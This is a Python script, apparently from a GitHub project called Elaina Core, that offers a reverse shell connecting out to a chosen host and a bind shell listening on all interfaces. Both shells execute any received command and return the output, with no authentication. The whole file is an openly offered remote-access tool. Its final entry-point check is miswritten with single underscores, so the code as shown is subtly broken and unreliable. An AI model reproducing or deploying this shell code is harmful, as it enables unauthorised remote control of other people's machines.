#!/usr/bin/env python3
# elaina_nc.py - Elaina Core lightweight netcat tool
# https://github.com/Yuri08loveElaina
# Reverse shell | Bind shell | GPG Signature ready

import socket
import subprocess
import argparse
import os

def reverse_shell(ip, port):
    try:
        s = socket.socket()
        s.connect((ip, port))
        s.send(b"[+] Connected to Elaina Core\n")
        while True:
            cmd = s.recv(1024).decode().strip()
            if cmd.lower() in ['exit', 'quit']:
                break
            if cmd:
                output = subprocess.getoutput(cmd)
                s.send(output.encode() + b"\n")
    except Exception as e:
        print(f"[!] Error: {e}")

def bind_shell(port):
    try:
        s = socket.socket()
        s.bind(('0.0.0.0', port))
        s.listen(1)
        print(f"[+] Listening on port {port}...")
        conn, addr = s.accept()
        conn.send(b"[+] Connected to Elaina Core\n")
        while True:
            cmd = conn.recv(1024).decode().strip()
            if cmd.lower() in ['exit', 'quit']:
                break
            if cmd:
                output = subprocess.getoutput(cmd)
                conn.send(output.encode() + b"\n")
    except Exception as e:
        print(f"[!] Error: {e}")

def main():
    parser = argparse.ArgumentParser(description="elaina_nc.py - Lightweight Netcat in Python")
    parser.add_argument("--reverse", nargs=2, metavar=('LHOST', 'LPORT'), help="Launch reverse shell")
    parser.add_argument("--bind", metavar='PORT', type=int, help="Launch bind shell")
    args = parser.parse_args()

    if args.reverse:
        lhost, lport = args.reverse
        reverse_shell(lhost, int(lport))
    elif args.bind:
        bind_shell(args.bind)
    else:
        parser.print_help()

if _name_ == "_main_":
    main()
